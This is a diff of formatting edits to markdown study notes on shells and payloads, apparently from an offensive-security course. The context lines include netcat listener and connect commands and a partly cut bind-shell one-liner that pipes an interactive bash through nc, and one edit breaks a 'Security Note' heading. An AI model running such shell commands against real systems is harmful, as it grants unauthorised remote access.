@@ -24,7 +24,7 @@ nc -lvnp <PORT>
 nc -nv <IP> <PORT>
 ```
 
-> **Note:** Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.
+> **NOTE:**  Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.
 
 </details>
 
@@ -43,7 +43,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <PORT> > /tm
 nc -nv <IP> <PORT>
 ```
 
-> **Note:** Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.
+> **NOTE:**  Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical.
 
 </details>
 
@@ -235,7 +235,7 @@ Primarily observed in:
 
 * Legacy system maintenance (rare edge cases)
 
-> **Security Note:** Execution typically requires explicit user interaction (e.g., enabling macros, clicking embedded objects).
+> **Security ** Execution typically requires explicit user interaction (e.g., enabling macros, clicking embedded objects).
 
 **MSI:** MSI files contain installation instructions and components for Windows applications. Attackers can exploit this system by:
 
